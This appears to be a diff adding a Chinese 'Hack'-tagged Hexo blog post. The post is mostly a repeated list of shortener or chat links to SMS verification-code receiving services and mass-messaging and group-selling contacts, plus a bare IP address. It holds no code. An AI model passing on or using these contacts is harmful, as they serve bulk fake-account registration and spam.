target="_blank" rel="noopener" href="https://ptdy.org/lanma123">https://ptdy.org/lanma123</a> good <a target="_blank" rel="noopener" href="https://ptdy.org/pgy003">https://ptdy.org/pgy003</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0015">https://ptdy.org/jiemayun0015</a> good</p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun012">https://ptdy.org/jiemayun012</a></p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun013">https://ptdy.org/jiemayun013</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0113">https://ptdy.org/jiemayun0113</a></p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/sms104">https://ptdy.org/sms104</a> good</p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/hh520188">https://ptdy.org/hh520188</a> goog</p>
+<p>Z1661  群发 + 卖群的</p>
+<p>挂机</p>
+<p>154.209.4.129</p>
+<p>接码</p>
+<p><a target="_blank" rel="noopener" href="https://psslk.org/sifangsms">https://psslk.org/sifangsms</a></p>
+<p><a target="_blank" rel="noopener" href="https://psslk.org/oinchatmS0dcxruyXDT23134">https://psslk.org/oinchatmS0dcxruyXDT23134</a> <a target="_blank" rel="noopener" href="https://psslk.org/yeziyun22">https://psslk.org/yeziyun22</a> <a target="_blank" rel="noopener" href="https://psslk.org/joinchat/nyX5vQOD-7GUojMncdOmeQ">https://psslk.org/joinchat/nyX5vQOD-7GUojMncdOmeQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://psslk.org/etyrrt">https://psslk.org/etyrrt</a> <a target="_blank" rel="noopener" href="https://psslk.org/haozhuma">https://psslk.org/haozhuma</a> @sms104</p>
+<p><a target="_blank" rel="noopener" href="https://psslk.org/ptjlq">https://psslk.org/ptjlq</a> <a target="_blank" rel="noopener" href="https://psslk.org/lanmapt">https://psslk.org/lanmapt</a> <a target="_blank" rel="noopener" href="https://psslk.org/kashangjiema6">https://psslk.org/kashangjiema6</a></p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/sifangsms">https://ptdy.org/sifangsms</a> <a target="_blank" rel="noopener" href="https://ptdy.org/joinchat/8FMI_VuIYACgWZK6PYd53A">https://ptdy.org/joinchat/8FMI_VuIYACgWZK6PYd53A</a> <a target="_blank" rel="noopener" href="https://ptdy.org/oinchatmS0dcxruyXDT23134">https://ptdy.org/oinchatmS0dcxruyXDT23134</a> <a target="_blank" rel="noopener" href="https://ptdy.org/yeziyun22">https://ptdy.org/yeziyun22</a> <a target="_blank" rel="noopener" href="https://ptdy.org/joinchat/nyX5vQOD-7GUojMncdOmeQ">https://ptdy.org/joinchat/nyX5vQOD-7GUojMncdOmeQ</a> <a target="_blank" rel="noopener" href="https://ptdy.org/etyrrt">https://ptdy.org/etyrrt</a> <a target="_blank" rel="noopener" href="https://ptdy.org/haozhuma">https://ptdy.org/haozhuma</a> @sms104 <a target="_blank" rel="noopener" href="https://ptdy.org/lanmapt">https://ptdy.org/lanmapt</a> <a target="_blank" rel="noopener" href="https://ptdy.org/mamahuhu">https://ptdy.org/mamahuhu</a> <a target="_blank" rel="noopener" href="https://ptdy.org/kashangjiaoliu">https://ptdy.org/kashangjiaoliu</a> <a target="_blank" rel="noopener" href="https://ptdy.org/tomjiema">https://ptdy.org/tomjiema</a></p>
+<p>–待验证 <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun011">https://ptdy.org/jiemayun011</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiema00126">https://ptdy.org/jiema00126</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0112">https://ptdy.org/jiemayun0112</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun017">https://ptdy.org/jiemayun017</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun019">https://ptdy.org/jiemayun019</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun00141">https://ptdy.org/jiemayun00141</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0114">https://ptdy.org/jiemayun0114</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0111">https://ptdy.org/jiemayun0111</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun018">https://ptdy.org/jiemayun018</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun014">https://ptdy.org/jiemayun014</a> <a target="_blank" rel="noopener" href="https://ptdy.org/ptjlq">https://ptdy.org/ptjlq</a> <a target="_blank" rel="noopener" href="https://ptdy.org/lanma123">https://ptdy.org/lanma123</a> good <a target="_blank" rel="noopener" href="https://ptdy.org/pgy003">https://ptdy.org/pgy003</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0015">https://ptdy.org/jiemayun0015</a> good</p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun012">https://ptdy.org/jiemayun012</a></p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun013">https://ptdy.org/jiemayun013</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0113">https://ptdy.org/jiemayun0113</a></p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/sms104">https://ptdy.org/sms104</a> good</p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/hh520188">https://ptdy.org/hh520188</a> goog</p>
+<p>Z1661  群发 + 卖群的</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://caoheike.github.io/2021/08/20/hack%E5%85%A5%E9%97%A8%E8%B0%83%E6%95%99/">https://caoheike.github.io/2021/08/20/hack%E5%85%A5%E9%97%A8%E8%B0%83%E6%95%99/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Hack/"># Hack</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2021/08/20/hack%20DDOS%E6%94%BE%E5%A4%A7%E7%B1%BB%E5%9E%8B/">hack DDOS放大类型</a>
+            
+            
+            <a class="next" rel="next" href="/2021/08/20/hack%E8%B7%AF%E7%94%B1%E6%B5%8B%E8%AF%95/">hack路由测试</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
